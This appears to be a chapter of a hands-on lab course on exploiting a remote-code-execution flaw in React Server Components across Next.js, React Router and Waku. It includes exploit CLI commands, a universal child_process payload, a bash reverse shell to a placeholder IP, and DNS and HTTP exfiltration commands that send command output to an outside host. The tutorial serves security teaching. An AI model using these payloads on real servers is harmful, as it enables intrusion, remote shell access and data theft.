# Chapter 4: Framework Differences

The same vulnerability affects multiple frameworks, but each requires different exploitation techniques. Understanding why teaches important lessons about web security.

---

## Why Different Frameworks Need Different Approaches

Although the core vulnerability is in React's Flight decoder, each framework:

1. **Uses different endpoints** for RSC requests
2. **Has different module systems** (CommonJS vs ESM)
3. **Handles errors differently** (affecting output retrieval)
4. **May have additional validation** layers

---

## Next.js: The Primary Target

Next.js is the most common RSC implementation and the easiest to exploit.

### Key Characteristics

| Aspect | Details |
|--------|---------|
| Endpoint | Any path with `Next-Action` header |
| Module System | CommonJS |
| Output Method | X-Action-Redirect header |
| Difficulty | Easy |

### Why Any Path Works

Next.js routes all requests through middleware that checks for the `Next-Action` header:

```javascript
// Simplified Next.js handling
if (request.headers.get('Next-Action')) {
  // Process as server action, regardless of path
  return handleServerAction(request);
}
```

### The CommonJS Advantage

Next.js uses CommonJS modules, so `process.mainModule` exists:

```javascript
// This works in Next.js:
process.mainModule.require('child_process')
```

### Lab Exercise

```bash
# Exploit Next.js
python cli/react2shell.py http://localhost:3011 -c "id"

# Try different paths - all work!
python cli/react2shell.py http://localhost:3011/any/path/here -c "id"
python cli/react2shell.py http://localhost:3011/does/not/exist -c "id"
```

---

## React Router: The ESM Challenge

React Router v7 uses experimental RSC support with ECMAScript Modules (ESM).

### Key Characteristics

| Aspect | Details |
|--------|---------|
| Endpoint | `/_rsc`, `/rsc`, `/__rsc` |
| Module System | ESM |
| Output Method | X-Action-Redirect header |
| Difficulty | Medium |

### The ESM Problem

ESM modules don't have `process.mainModule`:

```javascript
// In ESM environment:
console.log(process.mainModule);  // undefined!

// This FAILS:
process.mainModule.require('child_process')
// TypeError: Cannot read properties of undefined
```

### Understanding Module Systems

**CommonJS** (traditional Node.js):
```javascript
const fs = require('fs');           // Synchronous import
module.exports = { myFunction };    // Export
process.mainModule.require(...)     // Dynamic require
```

**ESM** (modern JavaScript):
```javascript
import fs from 'fs';                // Static import
export { myFunction };              // Export
// No process.mainModule!
```

### The Solution: `getBuiltinModule`

Node.js 20.16+ added `process.getBuiltinModule()` for ESM:

```javascript
// Works in ESM:
const cp = process.getBuiltinModule('child_process');
cp.execSync('id');
```

### Universal Payload Pattern

To work in both environments:

```javascript
var cp = process.getBuiltinModule
  ? process.getBuiltinModule('child_process')   // ESM
  : process.mainModule.require('child_process'); // CommonJS
```

### Lab Exercise

```bash
# This works because CLI uses universal payload:
python cli/react2shell.py http://localhost:3015 -F react-router -c "id"

# Specific endpoint required:
python cli/react2shell.py http://localhost:3015/_rsc -F react-router -c "id"
```

---

## Waku: The Blind RCE Challenge

Waku is a minimal React framework with unique characteristics that make exploitation more interesting.

### Key Characteristics

| Aspect | Details |
|--------|---------|
| Endpoint | `/RSC/F/{file}/{name}.txt` |
| Module System | ESM |
| Output Method | **None** (blind RCE) |
| Difficulty | Hard |

### Challenge 1: Path Validation

Waku validates RSC paths before processing:

```javascript
const decodeRscPath = (rscPath) => {
  if (!rscPath.endsWith(".txt")) {
    throw new Error("Invalid encoded rscPath");
  }
  // ... more processing
};
```

**Lesson:** Frameworks may have validation layers before vulnerable code.

### Why `.txt` Suffix?

Waku encodes RSC paths for safe URL transmission. The `.txt` suffix is part of this encoding scheme. Without it, requests are rejected before reaching the vulnerable decoder.

### Challenge 2: No Output in Response

Waku's error handling:

```javascript
catch (error) {
  // Error is logged but NOT exposed in response
  console.error(error);
  res.status(500).send('Internal Server Error');
}
```

The X-Action-Redirect technique doesn't work - Waku returns a generic 500 error.

**Lesson:** RCE doesn't always mean you see output. This is called "blind" RCE.

### Blind RCE Techniques

When you can't see output, you need alternative methods:

1. **File Write**
   ```bash
   # Write output to a file
   python cli/react2shell.py http://localhost:3014 -F waku \
     -c "id > /tmp/output.txt"

   # Retrieve via container access (in lab)
   docker exec react2shell-waku cat /tmp/output.txt
   ```

2. **Reverse Shell**
   ```bash
   # Get interactive access
   nc -lvnp 4444 &
   python cli/react2shell.py http://localhost:3014 -F waku \
     -c "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
   ```

3. **Out-of-Band (OOB) Exfiltration**
   ```bash
   # DNS exfiltration
   python cli/react2shell.py http://localhost:3014 -F waku \
     -c "nslookup \$(whoami).your-domain.com"

   # HTTP callback
   python cli/react2shell.py http://localhost:3014 -F waku \
     -c "curl http://your-server/\$(id|base64)"
   ```

### Lab Exercise

```bash
# Execute blind command
python cli/react2shell.py http://localhost:3014 -F waku \
  -c "echo PWNED > /tmp/proof.txt"

# Verify execution
docker exec react2shell-waku cat /tmp/proof.txt

# Capture the flag (blind)
python cli/react2shell.py http://localhost:3014 -F waku \
  -c "cat /app/flag.txt"

docker exec react2shell-waku cat /tmp/r2s_out.txt
```

---

## Comparison Summary

| Framework | Endpoint | Module | Output | Payload Complexity |
|-----------|----------|--------|--------|-------------------|
| Next.js | Any + header | CJS | HTTP header | Low |
| React Router | `/_rsc` | ESM | HTTP header | Medium |
| Waku | `/RSC/F/x/y.txt` | ESM | Blind | High |

---

## Knowledge Check

1. **Why doesn't `process.mainModule.require()` work in React Router?**
   <details>
   <summary>Answer</summary>
   React Router uses ESM (ECMAScript Modules), which don't have the `process.mainModule` property. ESM uses static imports instead of CommonJS's dynamic require.
   </details>

2. **What's special about Waku's path validation?**
   <details>
   <summary>Answer</summary>
   Waku requires paths to end with `.txt` and uses a specific format `/RSC/F/{file}/{name}.txt`. Without the correct format, requests are rejected before reaching the vulnerable code.
   </details>

3. **How do you confirm RCE when there's no output?**
   <details>
   <summary>Answer</summary>
   Use blind techniques: write to a file you can read later, trigger a reverse shell connection, or use out-of-band channels like DNS or HTTP requests to a server you control.
   </details>

4. **Why is understanding framework differences important?**
   <details>
   <summary>Answer</summary>
   Real-world exploitation requires adapting to the target. Different module systems, endpoints, and error handling all affect how you construct and verify exploits. A single "universal" payload often won't work everywhere.
   </details>

---

## Key Lessons

1. **Defense in depth matters** - Waku's path validation adds a layer (even if bypassable)
2. **Module systems affect payloads** - Know your target's environment
3. **Output channels vary** - Not all RCE gives you visible output
4. **Adapt to the target** - Universal exploits are rare in practice

---

**Next Chapter:** [Defense & Detection →](05-defense.md)
